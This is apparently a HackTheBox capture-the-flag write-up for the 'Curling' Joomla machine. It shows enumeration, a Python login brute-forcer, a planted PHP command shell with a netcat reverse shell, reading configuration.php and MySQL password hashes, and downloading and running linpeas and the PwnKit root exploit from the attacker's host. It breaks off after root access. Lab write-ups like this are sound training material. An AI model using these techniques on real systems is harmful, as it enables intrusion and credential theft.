---
layout: page
title: Curling
description: Curling from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/curling/logo.png" title="HTB Curling Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Curling">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Here we go taking a draw shot at the house to get the flag in this Curling box.  Plus, looking up curling terms so I could write this intro.

Let's run nmap to try to get the running services.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/curling]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.150            
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 21:30 AEDT
Nmap scan report for 10.10.10.150
Host is up (0.012s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   61.54 ms 10.10.16.1
2   8.39 ms  10.10.10.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds
```
{% endraw %}

<br />
Check the landing page the webserver is serving.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Since the landing page said cewl, let's run cewl.  Seems reasonable.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/curling]
└─$ cewl http://10.10.10.150 -d 3 --with-numbers > cewllist.txt
```
{% endraw %}

<br />
Give ffuf a run to fuzz faster looking for file and folders for port 80.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/curling]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.150/FUZZ -e .txt,.bak,.php -fw 762

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.150/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 762
________________________________________________

.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 208ms]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 258ms]
media                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 196ms]
templates               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 201ms]
modules                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 299ms]
bin                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 198ms]
plugins                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 195ms]
includes                [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 194ms]
language                [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 193ms]
README.txt              [Status: 200, Size: 4872, Words: 481, Lines: 73, Duration: 248ms]
components              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 353ms]
cache                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 348ms]
libraries               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 218ms]
tmp                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 198ms]
LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 347ms]
layouts                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 277ms]
secret.txt              [Status: 200, Size: 17, Words: 1, Lines: 2, Duration: 372ms]
administrator           [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 262ms]
configuration.php       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 234ms]
htaccess.txt            [Status: 200, Size: 3005, Words: 438, Lines: 81, Duration: 367ms]
cli                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 199ms]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 193ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 264ms]
:: Progress: [882236/882236] :: Job [1/1] :: 161 req/sec :: Duration: [1:25:20] :: Errors: 0 ::
```
{% endraw %}

<br />
Check the secrets.txt file on the webserver.

{% raw %}
```bash
Q3VybGluZzIwMTgh
```
{% endraw %}

<br />
Check the Administrator page looking for the login page.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/administrator.png" title="Administrator" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the joomscan to identify the version of Joomla! that we are working with.

{% raw %}
```bash
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.10.150 ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.8.8

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.10.150/administrator/components
http://10.10.10.150/administrator/modules
http://10.10.10.150/administrator/templates
http://10.10.10.150/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.10.150/administrator/

[+] Checking robots.txt existing
[++] robots.txt is not found

[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Your Report : reports/10.10.10.150/ 
```
{% endraw %}

<br />
Give admin:admin a whirl in ye old login page.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/adminadmin.png" title="admin:admin" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Catch and check the request in Burp.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/burp.png" title="Burp Suite" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Attempt to login with admin and the string from secret.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/adminsecret.png" title="admin secret" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Now let's give it a whirl with floris and the secret string.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/florissecret.png" title="floris secret" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Possibly it is Floris secret?

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/Florissecret.png" title="Floris secret" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Are spaces allowed in a username?

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/superusersecret.png" title="Super User secret" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Write a login brute-forcer that user rockyou and admin to try and crack the password.  I let it run for longer than I probably should have before giving up.

{% raw %}
```python
 import requests


def get_csrf(rt):
    return rt.split('csrf.token\":\"')[1].split('"')[0]

s = requests.Session()

print('[+] Starting script...')
with open('/usr/share/wordlists/rockyou.txt','r') as fs:
    url = 'http://10.10.10.150/administrator/index.php'
    for line in fs:
        passwd = line.rstrip('\n')

        response = s.get(url=url)
        token = get_csrf(response.text)
        headers = {'Content-Type':'application/x-www-form-urlencoded'}

        data = {'username':'admin',
                'passwd':passwd,
                'option':'com_login',
                'task':'login',
                'return':'aW5kZXgucGhw',
                token:'1'}
        login_response = s.post(url=url,headers=headers,data=data)
        if passwd != '' and 'do not match' not in login_response.text:
            print(f'[+] The password is: {passwd}')
            break
    else:
        print('[-] No credentials found')
```
{% endraw %}

<br />
Create a mutator to mutate our cewl list with the year at the end to spice it up a little.  Since 2018 and 2025 appear in the cewl list, use all years between 2018 and 2025. 

{% raw %}
```python
yr = ['2017','2018','2019','2020','2021','2022','2023','2024','2025']

with open('/home/kali/Documents/htb/curling/cewllist.txt','r') as fi:
    with open('/home/kali/Documents/htb/curling/cewlmut.txt','w') as fo:
        for line in fi:
            passwd = line.strip('\n')
            fo.write(passwd + '\n')
            for year in yr:
                updpass = passwd + year
                fo.write(updpass + '\n')
```
{% endraw %}

<br />
Update the brute-forcer to use the new mutated list.

{% raw %}
```python
import requests


def get_csrf(rt):
    return rt.split('csrf.token\":\"')[1].split('"')[0]

s = requests.Session()

print('[+] Starting script...')
with open('/home/kali/Documents/htb/curling/cewlmut.txt','r') as fs:
    url = 'http://10.10.10.150/administrator/index.php'
    for line in fs:
        passwd = line.rstrip('\n')

        response = s.get(url=url)
        token = get_csrf(response.text)
        headers = {'Content-Type':'application/x-www-form-urlencoded'}

        data = {'username':'admin',
                'passwd':passwd,
                'option':'com_login',
                'task':'login',
                'return':'aW5kZXgucGhw',
                token:'1'}
        login_response = s.post(url=url,headers=headers,data=data)
        if passwd != '' and 'do not match' not in login_response.text:
            print(f'[+] The password is: {passwd}')
            break
    else:
        print('[-] No credentials found')
```
{% endraw %}

<br />
Create a list of potential user.  I used this list hydra to try and brute-force hydra.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/curling]
└─$ cat users.txt                                          
Floris
admin
floris
curling
root
```
{% endraw %}

<br />
It was this point that I decided to ask ChatGPT for more information of that secret.txt string.  I didn't to just Google it because a write-up for this box would come up.  So, I thought this was the best option.  Turns out, it is a base64 string.  Decode the string.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/curling]
└─$ echo 'Q3VybGluZzIwMTgh' | base64 -d   
Curling2018!
```
{% endraw %}

<br>
Try using floris and the decoded password to try and login.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/florisdecode.png" title="floris decode" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Test for password ru-use with ssh.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/curling]
└─$ ssh floris@10.10.10.150                   
floris@10.10.10.150's password: 
Permission denied, please try again.
floris@10.10.10.150's password:
```
{% endraw %}

<br />
Check the available templates available.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/templates.png" title="Check Drupal templates" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
So, we are going to try code injection on the error.php template file.  Navigate there.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/error.png" title="Open error.php editor" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Navigate to the error.php in the browser just ensure that it is there and we can find it when it is time to execute code.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/browsererror.png" title="Navigate to the error.php" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the error.php file with a small command prompt.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/updateerror.png" title="Update the error.php" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Test the command execution.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/testcmd.png" title="Test Command Execution" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/curling]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Use revshells to generate a payload.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Use the payload from revshells in the c parameter.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/injectpayload.png" title="Inject Payload" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/curling]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.150] 43804
www-data@curling:/var/www/html/templates/beez3$
```
{% endraw %}

<br />
Run id to get a sense of who we are.

{% raw %}
```bash
www-data@curling:/var/www/html/templates/beez3$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endraw %}

<br />
Check the /etc/passwd file.

{% raw %}
```bash
www-data@curling:/var/www/html/templates/beez3$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
floris:x:1000:1004:floris:/home/floris:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```
{% endraw %}

<br />
Check the configuration.php file for the database password.

{% raw %}
```php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'Cewl Curling site!';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'floris';
        public $password = 'mYsQ!P4ssw0rd$yea!';
        public $db = 'Joombla';
        public $dbprefix = 'eslfu_';
        public $live_site = '';
        public $secret = 'VGQ09exHr8W2leID';
        public $gzip = '0';
        public $error_reporting = 'default';

<snip>
```
{% endraw %}

<br />
Test the database password for password re-use with floris.

{% raw %}
```bash
<?php
www-data@curling:/var/www/html$ su floris 
su floris
Password: mYsQ!P4ssw0rd$yea!

su: Authentication failure
```
{% endraw %}

<br />
Emumerate the mysql database.

{% raw %}
```bash
www-data@curling:/var/www/html$ mysql -u floris -p
mysql -u floris -p
Enter password: mYsQ!P4ssw0rd$yea!

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 45112
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Joombla            |
+--------------------+
2 rows in set (0.00 sec)

<snip>

mysql> select username, password from eslfu_users;
select username, password from eslfu_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| floris   | $2y$10$4t3DQSg0DSlKcDEkf1qEcu6nUFEr/gytHfVENwSmZN1MXxE1Ssx.e |
+----------+--------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> exit
exit
Bye
```
{% endraw %}

<br />
Run ss -antlp to get of the actively listening listeners.

{% raw %}
```bash
www-data@curling:/opt$ ss -antlp
ss -antlp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         128                       *:80                     *:*       
LISTEN   0         128                    [::]:22                  [::]:*
```
{% endraw %}

<br />
Run the uname -a to get the Linux version.

{% raw %}
```bash
www-data@curling:/opt$ uname -a
uname -a
Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```
{% endraw %}

<br />
Run /etc/issue to get the OS version.

{% raw %}
```bash
www-data@curling:/opt$ cat /etc/issue
cat /etc/issue
Ubuntu 18.04.5 LTS \n \l
```
{% endraw %}

<br />
Enumerate further and notice the password_backup file in floris.

{% raw %}
```bash
www-data@curling:/home/floris$ cat password_backup
cat password_backup
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```
{% endraw %}

<br />
Download the linpeas.sh.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/curling]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/linpeas.sh
--2025-06-12 00:52:23--  https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/linpeas.sh
Resolving github.com (github.com)... 4.237.22.38
Connecting to github.com (github.com)|4.237.22.38|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/f8fabb35-84b0-4242-a012-781469300c05?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250611%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250611T145234Z&X-Amz-Expires=300&X-Amz-Signature=97538deba36ca3f2539ce76ecf278672cc8caf65d4def8a87dbe5664748dbf9e&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-06-12 00:52:24--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/f8fabb35-84b0-4242-a012-781469300c05?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250611%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250611T145234Z&X-Amz-Expires=300&X-Amz-Signature=97538deba36ca3f2539ce76ecf278672cc8caf65d4def8a87dbe5664748dbf9e&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 954437 (932K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 932.07K  3.25MB/s    in 0.3s    

2025-06-12 00:52:25 (3.25 MB/s) - ‘linpeas.sh’ saved [954437/954437]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/curling]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer linpeas to the victim machine.  Run linpeas.sh.  I didn't copy the output.  Check the linux exploit suggester section.

{% raw %}
```bash
www-data@curling:/tmp$ wget 10.10.16.11:8000/linpeas.sh
wget 10.10.16.11:8000/linpeas.sh
--2025-06-11 14:52:52--  http://10.10.16.11:8000/linpeas.sh
Connecting to 10.10.16.11:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 954437 (932K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 932.07K   375KB/s    in 2.5s    

2025-06-11 14:52:55 (375 KB/s) - 'linpeas.sh' saved [954437/954437]

www-data@curling:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
```
{% endraw %}

<br />
Run linpeas.sh.

{% raw %}
```bash
www-data@curling:/tmp$ ./linpeas.sh
./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

<snip>

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

<snip>
```
{% endraw %}

<br />
Look-up the PwnKit in the GitHub.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/curling/github.png" title="GitHub" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a>

<br />
Download the PwnKit to the local Attack machine.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/curling]
└─$ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
```
{% endraw %}

<br />
Transfer PwnKit to the victim machine.

{% raw %}
```bash
www-data@curling:/tmp$ wget 10.10.16.11:8000/PwnKit
wget 10.10.16.11:8000/PwnKit
--2025-06-11 15:03:44--  http://10.10.16.11:8000/PwnKit
Connecting to 10.10.16.11:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: 'PwnKit'

PwnKit              100%[===================>]  17.62K  30.6KB/s    in 0.6s    

2025-06-11 15:03:46 (30.6 KB/s) - 'PwnKit' saved [18040/18040]

www-data@curling:/tmp$ chmod +x PwnKit
chmod +x PwnKit
```
{% endraw %}

<br />
Run PwnKit and run id to confirm success.

{% raw %}
```bash
www-data@curling:/tmp$ ./PwnKit
./PwnKit
root@curling:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
root@curling:/home/floris# cat user.txt
cat user.txt
<redacted>
root@curling:/home/floris# ip a
ip a
